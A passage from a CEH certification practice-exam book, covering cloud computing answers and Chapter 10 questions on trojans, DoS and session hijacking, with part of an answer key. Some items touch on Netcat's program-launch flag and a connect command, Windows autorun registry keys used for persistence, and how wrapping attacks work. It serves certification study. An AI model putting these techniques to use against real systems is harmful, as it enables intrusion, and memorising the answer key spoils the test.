efforts you absolutely need to know about.

CEH Certified Ethical Hacker Practice Exams

214

09-ch09.indd 214 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

The Federal Risk and Authorization Management Program (FedRAMP; www
.fedramp.gov/) is a government-wide program that provides a standardized approach
to security assessment, authorization, and continuous monitoring for cloud products
and services. It not only provides an auditable framework for ensuring basic security
controls for any government cloud effort, but also offers weekly tips for security
and configuration and even has free training available on the site. FedRAMP is the
result of close collaboration with cybersecurity and cloud experts from the General
Services Administration (GSA), National Institute of Standards and Technology
(NIST), Department of Homeland Security (DHS), Department of Defense (DoD),
National Security Agency (NSA), Office of Management and Budget (OMB), the
Federal Chief Information Officer (CIO) Council and its working groups, as well as
private industry.

☐✗ A is incorrect because the definition provided does not match the NIST Cloud
Computing Reference Architecture. NIST released Special Publication 500-292,
“NIST Cloud Computing Reference Architecture,” in 2011 to provide a “fundamental
reference point to describe an overall framework that can be used government wide”
(www.nist.gov/customcf/get_pdf.cfm?pub_id=909505).

☐✗ C is incorrect because the definition provided does not match the PCI Data Security
Standard (PCI DSS) Cloud Special Interest Group. PCI is not a federal government
regulatory body.

☐✗ D is incorrect because the definition provided does not match the Cloud Security
Alliance (CSA). CSA is the leading professional organization devoted to promoting
cloud security best practices and organizing cloud security professionals.

3. A business owner is advised that inventory, storage, sales, and backup online services can
be provided less expensively and more securely via a cloud service. After investigating the
options, the business owner determines the best cloud service provider for his needs also
happens to be the provider for several of his competitors. Should he decide to engage the
same provider, which cloud service deployment model will be used?

A. Private

B. Multi-cloud

C. Community

D. Public

☑ C. In most circumstances, it doesn’t matter who else uses the cloud provider you want
to use—what matters is the services provided, the costs, and the available security. A
community cloud model is one where the infrastructure is shared by several organizations,
usually with the same policy and compliance considerations. For example, multiple
different state-level organizations may get together and take advantage of a community
cloud for services they require. Or, in this case, even adversarial competitors may make
use of the same services from the same cloud provider.

Chapter 9: Security in Cloud Computing

215

09-ch09.indd 215 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☐✗ A is incorrect because a private cloud model is, not surprisingly, private in nature.
The cloud is operated solely for a single organization (aka single-tenant environment)
and is usually not a pay-as-you-go type of operation.

☐✗ B is incorrect because Multi-Cloud provides a single proprietary interface to combine
work spread across multiple cloud providers.

☐✗ D is incorrect because a public cloud model is one where services are provided over a
network that is open for public use (like the Internet). Public cloud is generally used
when security and compliance requirements found in large organizations aren’t a
major issue.

4. In “NIST Cloud Computing Reference Architecture,” which of the following is the
intermediary for providing connectivity between the cloud and the subscriber?

A. Cloud provider

B. Cloud carrier

C. Cloud broker

D. Cloud auditor

☑ B. I can guarantee you’ll see several questions from the cloud world on your exam,
and many of those questions will be simply identifying portions of “NIST Cloud
Computing Reference Architecture.” The cloud carrier is defined in the architecture
as the organization with the responsibility of transferring the data—akin to the power
distributor for the electric grid. The cloud carrier is the intermediary for connectivity
and transport between the subscriber and provider.

☐✗ A is incorrect because the cloud provider is the purveyor of products and services.

☐✗ C is incorrect because the cloud broker acts to manage the use, performance,
and delivery of cloud services as well as the relationships between providers and
subscribers. The broker “acts as the intermediate between consumer and provider and
will help consumers through the complexity of cloud service offerings and may also
create value-added cloud services as well.”

☐✗ D is incorrect because the cloud auditor is the independent assessor of cloud service
and security controls.

5. A company relies on a private cloud solution for most of its internal computing needs.
After expanding into more online retailing, it relies on a portion of a public cloud for
external sales and e-commerce offerings. Which of the following best describes the cloud
deployment type in use?

A. Private

B. Public

C. Hybrid

D. Community

CEH Certified Ethical Hacker Practice Exams

216

09-ch09.indd 216 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☑ C. A hybrid cloud deployment is exactly what is sounds like—a combination of two
or more deployment types together.

☐✗ A is incorrect because a private cloud deployment is operated solely for a single
organization (aka single-tenant environment).

☐✗ B is incorrect because a public cloud deployment model is one where services are
provided over a network that is open for public use (like the Internet).

☐✗ D is incorrect because a community cloud deployment model is one where the
infrastructure is shared by several organizations, usually with the same policy and
compliance considerations.

6. Cloud computing would be best suited for which of the following businesses?

A. A medical practice

B. An established rural general sales store

C. A law enforcement agency

D. A Christmas supply store

☑ D. Scenario questions like this will be peppered throughout your exam on multiple
topics, and cloud computing is no different. In this case, the Christmas supply
store is, by its very nature, seasonal. This means instead of a steady flow of business
and computing resources, it will need much more support during the last couple
months of the year than it would in, say, July. Cloud computing provides the elasticity
(another term you may see pop up) of adding or removing computing resources as
you need them, which could very well save the company money.

☐✗ A is incorrect. Of the choices provided, a medical practice would not be the best
choice because of the sensitive data it holds (not to mention the federally mandated
protections the practice would have to have in place for those records).

☐✗ B is incorrect because an established storefront with steady sales and employee staff
doesn’t necessarily need cloud services.

☐✗ C is incorrect because law enforcement agencies also deal with highly sensitive
information. Therefore, of the choices provided, this is not the best one.

7. A software company has decided to build and test web applications in a cloud computing
environment. Which of the following cloud computing types best describes this effort?

A. IaaS

B. PaaS

C. SaaS

D. Community

Chapter 9: Security in Cloud Computing

217

09-ch09.indd 217 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☑ B. This scenario is tailor-made for Platform as a Service (PaaS). Despite also being a
name brand recognized mostly during Easter for coloring eggs, PaaS is geared toward
software development, as it provides a platform that allows subscribers to create
applications without building the infrastructure it would normally take to develop
and launch software. Hardware and software are hosted by the provider on its own
infrastructure, so customers do not have to install or build homegrown hardware and
software for development work. PaaS doesn’t usually replace an organization’s actual
infrastructure; instead, it just offers key services the organization may not have onsite.

☐✗ A is incorrect because this does not describe Infrastructure as a Service. IaaS provides
virtualized computing resources over the Internet. A third-party provider hosts
infrastructure components, applications, and services on behalf of its subscribers,
with a hypervisor (such as VMware, Oracle VirtualBox, Xen, or KVM) running the
virtual machines as guests.

☐✗ C is incorrect because this does not describe Software as a Service. SaaS is simply
a software distribution model—the provider offers on-demand applications to
subscribers over the Internet.

☐✗ D is incorrect because community refers to the cloud deployment model, not the
type.

8. Which of the following statements is not true?

A. Private cloud is operated solely for a single organization.

B. Public cloud makes use of virtualized servers.

C. Public cloud is operated over an intranet.

D. Private cloud makes use of virtualized servers.

☑ C. Most of the time I deplore the “not” questions—they seem designed to trip
candidates up more than to test their knowledge—but virtually all certification
providers make use of them often. In this case, a private cloud is, of course, operated
solely for one organization, and virtualization is used in all cloud deployment models.
A public cloud, however, explicitly provides services on a network that is open for
public use (like the Internet).

☐✗ A, B, and D are incorrect because these are true statements.

9. A company relies solely on Google Docs, Google Sheets, and other cloud-based provisions
for its office documentation software needs. Which of the following cloud computing
types best describes this?

A. SaaS

B. PaaS

C. IaaS

D. Public

CEH Certified Ethical Hacker Practice Exams

218

09-ch09.indd 218 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☑ A. This scenario aptly describes Software as a Service. SaaS is a software distribution
model—the provider offers on-demand applications to subscribers over the Internet.
Google Docs and Google Sheets, where word processing and spreadsheet software
actions are provided online, are perfect examples. Microsoft is also big in the SaaS
game, and Office 365 is seemingly taking over for the traditional Microsoft Office
suite. Instead of installing it on your system or buying it preinstalled at Best Buy (or
whatever vendor you use), you can “rent” Office 365—get what you need for as long
as you need. Given that Office is the world’s leading office productivity software, it
shouldn’t come as a surprise that Office 365 is a big hit. The U.S. Air Force, for one
example, moved over half a million e-mail accounts to Office 365 in January of 2019.

☐✗ B is incorrect because Platform as a Service is a great choice for software development,
but it’s not designed to provide software services in this manner.

☐✗ C is incorrect because Infrastructure as a Service is not designed to provide software
services like those described.

☐✗ D is incorrect because public refers to the deployment model.

10. A subscriber purchases machine virtualization and hosting through Amazon EC2. Which
of the following cloud computing types does this describe?

A. IaaS

B. PaaS

C. SaaS

D. Hybrid

☑ A. There are three types of cloud computing implementation: IaaS, PaaS, and SaaS.
In the case of Amazon EC2, Infrastructure as a Service best matches the description.
IaaS basically provides virtualized computing resources over the Internet. A third-
party provider hosts infrastructure components, applications, and services on behalf
of its subscribers, with a hypervisor (such as VMware, Oracle VirtualBox, Xen, or
KVM) running the virtual machines as guests. Collections of hypervisors within the
cloud provider exponentially increase the virtualized resources available and provide
scalability of service to subscribers. As a result, IaaS is a good choice, not just for
day-to-day infrastructure service, but also for temporary or experimental workloads
that may change unexpectedly. IaaS subscribers typically pay on a per-use basis
(within a certain timeframe, for instance) or sometimes by the amount of virtual
machine space used.

☐✗ B is incorrect because Platform as a Service does not best match this description.
PaaS is geared toward software development, as it provides a development platform
that allows subscribers to develop applications without building the infrastructure it
would normally take to develop and launch software.

☐✗ C is incorrect because Software as a Service does not best match this description. SaaS
is probably the simplest and easiest to think about. It is simply a software distribution
model—the provider offers on-demand applications to subscribers over the Internet.

Chapter 9: Security in Cloud Computing

219

09-ch09.indd 219 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☐✗ D is incorrect because hybrid does not best match this description. The term hybrid
deals with the deployment method of the cloud (for example, if you had a cloud
environment that was both “public” and “community” in nature, it would be referred
to as hybrid).

11. Which of the following are true statements regarding containers and virtualization?
(Choose two.)

A. Virtualization runs multiple operating systems on a single physical system.

B. Virtualization leverages multiple physical systems to create virtual operating systems.

C. Containers are placed on a single physical system and OS.

D. Multiple containers require multiple operating systems on the host device.

E. Containers and virtual machines are the same thing.

☑ A, C. I can virtually guarantee you’ll see comparisons of containers and virtual
machines on your exam, and because the wording in their definitions is so close,
it’s easy to get them confused. The main difference to keep in mind between the
two is that containers share the OS of the system they’re on, whereas VMs are their
own separate entities with their own OSs. Virtually speaking, think of a container
as a package and a VM as a complete system. A container holds all the components
necessary for an application to run, and it relies on the underlying OS to host. A VM
is a complete virtual system, with its own operating system.

☐✗ B, D, and E are incorrect because they’re not true statements.

12. Which of the following attacks occurs during the translation of SOAP messages?

A. Wrapping attack

B. Cross-guest VM

C. Side channel

D. Session riding

☑ A. Attacks aren’t necessarily specific to cloud computing, but EC-Council covers
wrapping attacks here, so we’ll follow suit. In a wrapping attack, the user sends a
request to the server, but the SOAP response is intercepted by the attacker. He then
duplicates the original message and sends it as if he is the user. In short, to pull this
off, you just intercept the response, change the data in the SOAP envelope, and
replay.

☐✗ B and C are incorrect because this does not describe cross-guest VM attacks, which
are also known as side-channel attacks and deal with virtualization itself. If an attacker
can somehow gain control of an existing VM (or place his own) on the same physical
host as the target, he may be able to pull off lots of malicious activities.

☐✗ D is incorrect because this does not describe a session riding attack. Session riding is,
in effect, simply CSRF under a different name and deals with cloud services instead
of traditional data centers.

CEH Certified Ethical Hacker Practice Exams

220

09-ch09.indd 220 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

13. Which of the following is an architectural pattern in computer software design in which
application components provide services to other components via a communications
protocol, typically over a network?

A. API

B. SOA

C. EC2

D. IaaS

☑ B. In service-oriented architecture (SOA), software is designed where each of the
individual components works and communicates with components on different
systems across the network. Each computer can run any of the services in the
software, and each individual component is built so that it can exchange information
with any other service in the network, without interaction or the need to make
changes to the software. For example, someone might create an API that provides
access to a database, which then allows third-party vendors to create their own
applications to take advantage of it.

☐✗ A is incorrect because this does not define an application programming interface.
APIs are sets of protocols and tools for building applications.

☐✗ C is incorrect because EC2 is a cloud service offering from Amazon.

☐✗ D is incorrect because IaaS is a cloud type.

14. In “NIST Cloud Computing Reference Architecture,” which entity manages cloud
services and maintains the relationship between cloud providers and subscribers?

A. Cloud broker

B. Cloud auditor

C. Cloud carrier

D. Cloud consumer

☑ A. “NIST Cloud Computing Reference Architecture” defines the cloud broker as the
entity that acts to manage the use, performance, and delivery of cloud services, as
well as the relationships between providers and subscribers. The broker “acts as the
intermediate between consumer and provider and will help consumers through the
complexity of cloud service offerings and may also create value-added cloud services
as well.”

☐✗ B is incorrect because the cloud auditor is the independent assessor of the cloud
service provider’s security controls.

☐✗ C is incorrect because the cloud carrier is the organization that has the responsibility
of transferring the data between the provider and subscriber.

☐✗ D is incorrect because the cloud consumer is the individual or organization that
acquires and uses cloud products and services.

Chapter 9: Security in Cloud Computing

221

09-ch09.indd 221 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

15. Which of the following is not a benefit of virtualization?

A. It allows for more efficient backup, data protection, and disaster recovery.

B. It reduces system administration work.

C. It improves operational efficiency.

D. It locks individual hardware to each individual virtual machine.

☑ D. Some of you may actually work with and in a cloud, and you may disagree with at
least one of the benefits listed here. However, while there may be differences between
the real world and your CEH exam, for your test you really need to know the benefits of
virtualization. The idea itself is great—run one or more operating systems simultaneously
on the same physical box by virtualizing the hardware to each OS. Multiple companies
(such as VMware, Oracle VirtualBox, and Xen) provide the hypervisor (aka virtual
machine monitor, or VMM, which is an application or hardware that creates and
runs virtual machines) that allows multiple OSs to share the same physical machine
hardware. Virtualizing your server can improve operational efficiency, provide for more
efficient backups, offer disaster recovery and data protection, and reduce administrative
work. Additionally, virtualization may have a positive effect on ensuring control and
compliance throughout the network, as well as reduce overall costs.

☐✗ A, B, and C are incorrect because these are all benefits of the virtualization of servers.

16. A company acquires a cloud environment for much of its business IT needs. The
environment is used and operated solely for the single organization. Which of the
following represents the cloud deployment model in question?

A. Public

B. IaaS

C. Sole source

D. Private

☑ D. In a private cloud model, the cloud is operated solely for a single organization
(aka single-tenant environment) and is usually not a type of pay-as-you-go operation.
Private clouds are usually preferred by larger organizations because the hardware is
dedicated and security and compliance requirements can be more easily met.

☐✗ A is incorrect because a public cloud is for use by anyone and everyone.

☐✗ B is incorrect because IaaS is a cloud type providing virtualized computing
resources over the Internet. A third-party provider hosts infrastructure components,
applications, and services on behalf of its subscribers, with a hypervisor running
the virtual machines as guests. IaaS is a good choice for day-to-day infrastructure
service and temporary or experimental workloads that may change unexpectedly. IaaS
subscribers typically pay on a per-use basis (within a certain timeframe, for instance)
or sometimes by the amount of virtual machine space used.

☐✗ C is incorrect because sole source is not a deployment method.

CEH Certified Ethical Hacker Practice Exams

222

09-ch09.indd 222 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

17. Which of the following statements is true regarding cloud computing?

A. Security in the cloud is the responsibility of the provider only.

B. Security in the cloud is the responsibility of the consumer only.

C. Security in the cloud is the responsibility of both the consumer and the provider.

D. None of the above.

☑ C. One of the biggest misconceptions about cloud computing seems to be where
the lines of responsibility are drawn. However, it should come as no surprise that
security is everyone’s responsibility, and that absolutely extends to the cloud. The
provider must protect the hardware, virtualization, VMs, and network connectivity.
The consumer must protect their virtual systems (OSs, applications, and data).
Sometimes this is a challenge in the real world. Where does your testing start and
end? If your entire system relies on a cloud provider to remain up and secure, can you
test all of it? And what happens if your resources are comingled somewhere inside all
that cloud secret sauce? Can you really trust they’re on top of things, security-wise?
Should you? Can you? And lastly, remember that whatever issues you had before
migrating to the cloud won’t magically disappear once you’ve migrated. In effect,
“you take your problems with you,” as my humble tech editor is known to say, so all
those app vulnerabilities, authentication problems, and other technical (and especially
administrative) problems are still yours to deal with, whether you’re in the cloud or not.

☐✗ A, B, and D are all incorrect statements.

18. Which tool offers penetration-test-like services for Amazon EC2 customers?

A. CloudPassage Halo

B. Core Cloud

C. CloudInspect

D. Panda Cloud Office Protection

☑ C. CloudInspect (www.coresecurity.com/corelabs-research/projects/core-cloudinspect)
is “a tool that profits from the Core Impact & Core Insight technologies to offer
penetration-testing as a service from Amazon Web Services for EC2 users.” It’s obviously
designed for AWS cloud subscribers and runs as an automated, all-in-one testing suite
specifically for your cloud subscription.

☐✗ A is incorrect because CloudPassage Halo (www.cloudpassage.com) “provides instant
visibility and continuous protection for servers in any combination of data centers,
private clouds and public clouds. The Halo platform is delivered as a service, so it
deploys in minutes and scales on-demand. Halo uses minimal system resources, so
layered security can be deployed where it counts, right at every workload—servers,
instances and containers.” Other tools for cloud pen testing you should know for your
exam include Dell Cloud Manager and Parasoft SOAtest.

Chapter 9: Security in Cloud Computing

223

09-ch09.indd 223 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☐✗ B is incorrect because there is no such tool.

☐✗ D is incorrect because Panda Cloud Office Protection is not an automated pen test
tool suite.

19. An attacker sets up a VM on the same physical cloud host as the target’s VM. He then
takes advantage of the shared physical resources to steal data. Which of the following
describes this attack?

A. Side channel

B. VM flood

C. Session riding

D. Cybersquatting

☑ A. The side-channel attack, also known as a cross-guest VM breach, occurs when
an attacker gets a virtual machine on the same host as the target. Through a variety
of means for taking advantage of vulnerabilities in some shared technologies, the
attacker then uses the shared physical resources to pilfer data. Providers can mitigate
these attacks by using an up-to-date hypervisor provision, implementing strong
virtual firewalls between guest OSs, and enforcing the use of encryption. Subscribers
can help by locking down (hardening) their OSs and using good coding in their
applications (especially when it comes to accessing resources such as memory). As a
fun aside, these types of attacks are categorized by people who actually pen test for a
living as a unicorn attack—since you’ll have as good a chance seeing a unicorn as you
will actually performing this attack.

☐✗ B is incorrect because, although VM flood may sound cool, it is not a legitimate
attack term.

☐✗ C is incorrect because session riding is a CSRF attack inside the cloud.

☐✗ D is incorrect because cybersquatting has nothing to do with this attack.

20. Which of the following is a container orchestration platform created by Google to
automate creating, managing, scaling, and deleting containers?

A. Docker

B. Kubernetes

C. Microservices

D. Serverless computing

☑ B. Kubernetes (also known as K8s) is a container orchestration platform. If you
happen to install multiple Docker containers on multiple hosts with different
operating systems, Kubernetes can bring them all together in one management
platform. Kubernetes is open source, portable and extensible, and can be installed
virtually anywhere. Features include, but are not limited to, service discovery, load
balancing, storage allocation, rollouts, rollbacks, and configuration management.

CEH Certified Ethical Hacker Practice Exams

224

09-ch09.indd 224 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

☐✗ A is incorrect because Docker is an open source container platform. Docker containers
hold all the components necessary to run an application or service but rely on the
underlying OS of the host system.

☐✗ C is incorrect because microservices are cloud-hosted sub-applications that perform
specific, unique tasks.

☐✗ D is incorrect because serverless computing is a Function as a Service (FaaS) term.
In other words, it refers to a cloud-based application where the infrastructure and
requirements are provided by the cloud vendor as needed.

Chapter 9: Security in Cloud Computing

225

09-ch09.indd 225 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9/ Blind Folio: 226

This page intentionally left blank

09-ch09.indd 226 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

CHAPTER

Trojans and Other Attacks 10
This chapter includes questions from the following topics:

• Describe malware types and their purpose
• Identify malware deployment methods
• Describe the malware analysis process
• Identify malware countermeasures
• Describe DoS attacks and techniques
• Identify DoS detection and countermeasure actions
• Describe session hijacking and sequence prediction

Every new hobby and activity ends up with a huge learning curve, with all sorts of lingo and
terminology to figure out. And, usually, it winds up costing a lot of money. For example, suppose
you decide to get into photography. All of a sudden you’re learning about ISO ratings and satu-
ration—and buying insanely expensive cameras and lenses because you need them. What if you
decide to take up bass fishing? Oh, now we’re talking about some serious considerations.

Braid versus monofilament line? Fluorocarbon gets my vote for leader material, but braid’s
great for the back end. Baitcast versus spinning reel? I’d say that depends on the situation, but
unless you can figure out the centrifugal braking systems and tension settings, with plenty of time
to practice, spinning may be your best bet. Rod material and makeup? Hook style? Knots to use?
And don’t get me started on electronics for your boat!

And as we also know with every hobby, there are rules and expectations for the use of everything
you buy. The people who have been engaging in it for a long time usually look at newcomers with
a bemused derision, mocking the misuse of tools and techniques until they get with the program
and do what everyone else is doing. In bass fishing, this idea kept loads of people from catching
lots of fish.

For decades, the use of a particular bait known as a jig was relegated by those who knew
everything to one method of presentation: flip the jig directly into really heavy cover (bushes,
sticks, lily pads, and so on) and gently pop it around the bottom until a fish bites. In 1996, a bass
professional named Bill Lowen was fishing a tournament with a jig the same way everyone else
had been using it since the dawn of artificial bait fishing. He had tossed it in a tree that had fallen
over into the water, and was slowly working it back. Deciding to move to another place, he started
reeling the jig back to him and—whammo—fish on! At the next spot, he started fishing again,

227

10-ch10.indd 227 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

but decided to try reeling the jig back to him, instead of using it like everyone else did. Whammo!
Another fish on. He wound up winning that tournament, and in doing so created a brand-new
technique called “swimming” a jig.

Why all this about bass fishing and techniques? Because it’s applicable to our work here as
ethical hackers. See, there are two ways to catch fish on any given lure—first, by using the lure
the way it was designed, and, second, by using it in whatever way it catches fish. Whether the
technique is “dead-sticking” a worm or, believe it or not, using a wrench as a lure (don’t laugh—
I’ve seen it with my own eyes), whatever works to catch fish is what should be used, right? In
ethical hacking, the same thing applies. Malware certainly won’t ever be confused with a “good
side” tool, but maybe you can use it in a different way than it was intended. Your pen test tool set
can be augmented by visiting the dark side yourself, wielding tools and actions that may seem a
bit unsavory to you and in ways you just haven’t thought about.

STUDY TIPS There hasn’t been a whole lot of change over the last couple of
versions when it comes to malware and related attacks, and it seems this go
around the focus may be waning; malware makes up a mere 6 percent of the
exam as of this writing. Most of the questions from the malware sections—

especially those designed to trip you up—still will be of the pure memorization type.
Stick with key words for each definition (it’ll help you in separating good answers from
bad ones), especially for the virus types. Don’t miss an easy point on the exam because
you forgot the difference between polymorphic and multipartite or why a worm is
different from a virus. Tool identification should also be relatively straightforward
(assuming you commit all those port numbers to memory, like I told you to do).

Finally, as always, get rid of the answers you know to be wrong in the first place. It’s
actually easier sometimes to identify the ones you downright know aren’t relevant to the
question. Then, from the remainder, you can scratch your gray matter for the key word
that will shed light on the answer.

CEH Certified Ethical Hacker Practice Exams

228

10-ch10.indd 228 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

QUESTIONS

1. Bart receives an e-mail that appears to be from his lawyer containing a ZIP file named Q
Courtdoc.zip. Bart double-clicks the ZIP file to open it, and a message stating “This
word document is corrupt” appears. In the background, a file named Courtdoc.zip.exe
runs and copies itself to the local APPDATA directory. It then begins beaconing to an
external server. Which of the following best describes the malware Bart installed?

A. Worm

B. Virus

C. Trojan

D. Macro

2. You have established a Netcat connection to a target machine. Which flag can be used to
launch a program?

A. -p

B. -a

C. -l

D. -e

3. Claire is surfing the Web and, after some time, a message pops up stating her system
has been infected by malware and offering a button to click for removal of the virus.
After she clicks the button, another message window appears stating the system has been
quarantined due to the nature of the infection and provides a link with instructions
to pay in order to regain control and to clear the virus. Which of the following best
describes this infection?

A. Spyware

B. Ransomware

C. Trojan

D. Adware

4. Matty is examining malware as part of a security effort. She performs analysis of the
malware executable without running or installing it. Instead, she examines source and
binary code to find data structures, function calls, and other indicators of malicious
behavior. Which of the following best describes the type of malware analysis Matty is
performing?

A. Static

B. Dynamic

C. File fingerprinting

D. Code emulation

Chapter 10: Trojans and Other Attacks

229

10-ch10.indd 229 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

5. Pen test team member Amy attempts to guess the ISN for a TCP session. Which attack is
she most likely carrying out?

A. XSS

B. Session splicing

C. Session hijacking

D. Multipartite attack

6. An attacker wants to make his malware as stealthy and undetectable as possible. He
employs an effort that uses compression to reduce the file size of the malware. Which of
the following best describes this?

A. Crypter

B. Wrapper

C. Packer

D. Compressor

7. Which of the following best describes a type of network attack whereby an attacker gains
access to your network and remains undetected for a long time period?

A. Fileless malware

B. Zombie

C. Fraggle

D. APT

8. An attacker makes use of the Beacon implant on a target system to hijack a browser
session. Which of the following best describes this attack?

A. Man in the browser

B. Man in the middle

C. Man in the pivot

D. IE hijacking

9. Claire’s Windows system at work begins displaying strange activity, and she places a call
to the IT staff. On investigation, it appears Claire’s system is infected with several viruses.
The IT staff removes the viruses by deleting several file and folder locations and using
an AV tool and then reconnects the machine to the network. Later in the day, Claire’s
system again displays strange activity and the IT staff is called once again. Which of the
following are likely causes of the reinfection? (Choose all that apply.)

A. Claire revisits a malicious website.

B. Claire opens her Microsoft Outlook e-mail client and newly received e-mail is loaded
to her local folder (.pst file).

C. Claire uses a system restore point to regain access to deleted files and folders.

D. Claire uses the organization’s backup application to restore files and folders.

CEH Certified Ethical Hacker Practice Exams

230

10-ch10.indd 230 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

10. In regard to Trojans, which of the following best describes a wrapper?

A. The legitimate file the Trojan is attached to

B. A program used to bind the Trojan to a legitimate file

C. A method of obfuscation using compression

D. A software tool that uses encryption and code manipulation to hide malware

11. In May 2017, this ransomware took advantage of a Windows SMB vulnerability known as
the Eternal Blue exploit and spread worldwide in a matter of hours. A hidden kill switch
inside the coding was quickly discovered, halting its spread. Which of the following best
fits this description?

A. Petya

B. WannaCry

C. Zeus

D. Botnet

12. Which of the following is a legitimate communication path for the transfer of data?

A. Overt

B. Covert

C. Authentic

D. Imitation

E. Actual

13. In what layer of the OSI reference model is session hijacking carried out?

A. Data Link layer

B. Transport layer

C. Network layer

D. Physical layer

14. A pen test team member types the following command:
nc222.15.66.78 –p 8765

Which of the following statements is true regarding this attempt?

A. The attacker is attempting to connect to an established listening port on a remote
computer.

B. The attacker is establishing a listening port on his machine for later use.

C. The attacker is attempting a DoS against a remote computer.

D. The attacker is attempting to kill a service on a remote machine.

Chapter 10: Trojans and Other Attacks

231

10-ch10.indd 231 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

15. Examine the partial command-line output listed here:
Active Connections
Proto Local Address Foreign Address State

TCP 0.0.0.0:912 COMPUTER11:0 LISTENING
TCP 0.0.0.0:3460 COMPUTER11:0 LISTENING
TCP 0.0.0.0:3465 COMPUTER11:0 LISTENING
TCP 0.0.0.0:8288 COMPUTER11:0 LISTENING
TCP 0.0.0.0:16386 COMPUTER11:0 LISTENING
TCP 192.168.1.100:139 COMPUTER11:0 LISTENING
TCP 192.168.1.100:58191 173.194.44.81:https ESTABLISHED
TCP 192.168.1.100:58192 173.194.44.81:https TIME_WAIT
TCP 192.168.1.100:58193 173.194.44.81:https TIME_WAIT
TCP 192.168.1.100:58194 173.194.44.81:https ESTABLISHED
TCP 192.168.1.100:58200 bk-in-f138:http TIME_WAIT

Which of the following is a true statement regarding the output?

A. This is output from a netstat -an command.

B. This is output from a netstat -b command.

C. This is output from a netstat -e command.

D. This is output from a netstat -r command.

16. You are discussing malware with a new pen test member who asks about restarting
executables. Which registry keys within Windows automatically run executables and
instructions? (Choose all that apply.)

A. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServicesOnce

B. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServices

C. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunOnce

D. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

17. Which of the following is a true statement?

A. Sequence prediction attacks are specific to TCP.

B. Using a protocol in a way it is not intended to be used is an example of an overt channel.

C. All DoS and DDoS attacks are specific to TCP.

D. Fraggle is a TCP-based attack.

18. Which denial-of-service attack involves using multiple intermediary and secondary
machines to contribute to the DoS effort?

A. SYN flood

B. DRDoS

C. Application-level flood

D. LOIC

CEH Certified Ethical Hacker Practice Exams

232

10-ch10.indd 232 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

19. Which of the following best describes malware that infects legitimate software using
existing vulnerabilities to carry out malicious activities?

A. Fileless malware

B. APT

C. Dynamic analysis

D. Ping of death

20. IPSec is an effective preventative measure against session hijacking. Which IPSec mode
encrypts only the data payload?

A. Transport

B. Tunnel

C. Protected

D. Spoofed

21. What provides for both authentication and confidentiality in IPSec?

A. AH

B. IKE

C. OAKLEY

D. ESP

22. Which of the following statements best describes the comparison between spoofing and
session hijacking?

A. Spoofing and session hijacking are the same thing.

B. Spoofing interrupts a client’s communication, whereas hijacking does not.

C. Hijacking interrupts a client’s communication, whereas spoofing does not.

D. Hijacking emulates a foreign IP address, whereas spoofing refers to MAC addresses.

23. Which of the following is an effective deterrent against TCP session hijacking?

A. Install and use an HIDS on the system.

B. Install and use Tripwire on the system.

C. Enforce good password policy.

D. Use unpredictable sequence numbers.

24. Which of the following is a group of Internet computers set up to forward transmissions
to other computers on the Internet without the owner’s knowledge or permission?

A. Botnet

B. Zombie

C. Honeypot

D. DDoS

Chapter 10: Trojans and Other Attacks

233

10-ch10.indd 233 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

25. Which of the following best describes a process for discovering the hash value for a given
binary code?

A. String searching

B. Dependency walking

C. File fingerprinting

D. Port monitoring

26. When is session hijacking performed?

A. Before the three-step handshake

B. During the three-step handshake

C. After the three-step handshake

D. After a FIN packet

CEH Certified Ethical Hacker Practice Exams

234

10-ch10.indd 234 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10

QUICK ANSWER KEY

1. C 10. B 19. A

2. D 11. B 20. A

3. B 12. A 21. D
